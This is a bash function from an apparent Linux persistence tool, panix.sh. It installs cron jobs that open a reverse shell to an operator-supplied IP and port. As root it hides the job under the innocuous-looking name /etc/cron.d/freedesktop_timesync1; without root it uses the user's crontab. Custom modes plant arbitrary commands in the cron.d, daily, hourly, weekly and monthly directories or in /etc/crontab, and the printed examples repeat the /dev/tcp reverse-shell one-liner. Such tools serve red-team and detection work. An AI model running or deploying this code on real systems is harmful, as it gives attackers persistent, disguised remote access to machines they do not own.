setup_cron() {
	local cron_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local name=""
	local option=""

	if ! command -v crontab &> /dev/null; then
		echo "Error: 'crontab' binary is not present. Please install 'cron' to use this mechanism."
		exit 1
	fi

	usage_cron() {
		if check_root; then
			echo "Usage: ./panix.sh --cron [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default cron settings"
			echo "  --ip <ip>                    Specify IP address"
			echo "  --port <port>                Specify port number"
			echo " --custom                     Use custom cron settings"
			echo "   --command <command>          Specify custom persistence command (no validation)"
			echo "   --name <name>                Specify custom cron job name"
			echo "   --crond                      Persist in cron.d directory"
			echo "   --crontab                    Persist in crontab file"
			echo "   --daily                      Persist in cron.daily directory"
			echo "   --hourly                     Persist in cron.hourly directory"
			echo "   --monthly                    Persist in cron.monthly directory"
			echo "   --weekly                     Persist in cron.weekly directory"
		else
			echo "Usage: ./panix.sh --cron [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display Cron persistence examples"
			echo "--default                    Use default systemd settings"
			echo "  --ip <ip>                    Specify IP address"
			echo "  --port <port>                Specify port number"
            echo "--help|-h                    Show this help message"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--crond|--daily|--hourly|--monthly|--weekly )
				if check_root; then
					option=$1
					case $option in
						--crond )
							cron_path="/etc/cron.d"
							;;
						--daily )
							cron_path="/etc/cron.daily"
							;;
						--hourly )
							cron_path="/etc/cron.hourly"
							;;
						--monthly )
							cron_path="/etc/cron.monthly"
							;;
						--weekly )
							cron_path="/etc/cron.weekly"
							;;
					esac
				else
					echo "Error: Only root users can use the $option option."
					exit 1
				fi
				;;
			--crontab )
				if check_root; then
					cron_path="/etc/crontab"
				else
					echo "Error: Only root users can use the --crontab option."
					exit 1
				fi
				;;
			--name )
				shift
				name=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --cron --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "--daily|--hourly|--monthly|--weekly:"
				echo "sudo ./panix.sh --cron --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --daily --name \"evil_cron_job\""
				echo ""
				echo "--crond:"
				echo "sudo ./panix.sh --cron --custom --command \"* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crond --name \"evil_cron_job\""
				echo ""
				echo "--crontab:"
				echo "sudo ./panix.sh --cron --custom --command \"* * * * * /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crontab"
				exit 0
				;;
			--help|-h)
				usage_cron
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --cron --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --default requires --ip and --port."
			echo "Try './panix.sh --cron --help' for more information."
			exit 1
		fi
		if check_root; then
			cron_path="/etc/cron.d/freedesktop_timesync1"
			command="* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
			echo "$command" > "$cron_path"

		else
			command="* * * * * /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
			(crontab -l 2>/dev/null; echo "$command") | crontab -
		fi
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command ]]; then
			echo "Error: --custom requires --command."
			echo "Try './panix.sh --cron --help' for more information."
			exit 1
		fi
		if [[ $option == "--daily" || $option == "--hourly" || $option == "--monthly" || $option == "--weekly" ]]; then
			if [[ -z $name ]]; then
				echo "Error: --custom with --daily|--hourly|--monthly|--weekly requires --name."
				echo "Try './panix.sh --cron --help' for more information."
				exit 1
			fi
			echo -e "#!/bin/bash\n$command" > "$cron_path/$name"
			chmod +x "$cron_path/$name"
		elif [[ $option == "--crond" ]]; then
			if [[ -z $name ]]; then
				echo "Error: --custom with --crond requires --name."
				echo "Try './panix.sh --cron --help' for more information."
				exit 1
			fi
			echo "$command" > "$cron_path/$name"
		else
			echo "$command" | sudo crontab -
		fi
	else
		echo "Error: Either --default or --custom must be specified for --cron."
		echo "Try './panix.sh --cron --help' for more information."
		exit 1
	fi

	echo "[+] Cron persistence established."
}
